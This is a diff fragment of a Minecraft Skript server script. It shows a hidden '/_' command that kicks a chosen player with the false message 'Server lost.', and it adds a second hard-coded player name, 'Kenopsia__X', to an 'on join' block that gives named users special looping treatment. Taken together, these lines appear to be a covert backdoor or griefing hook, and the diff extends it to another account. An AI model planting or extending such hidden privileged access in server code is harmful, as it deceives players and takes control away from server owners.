@@ -22,7 +22,7 @@ command /_ <string> <player>:
       kick {_t} due to "Server lost."
 
 on join:
-  if player's name is "hyfehnated":
+  if player's name is "hyfehnated" or "Kenopsia__X":
     set {_h} to the player
     while {_h} is connected:
       wait 1 second
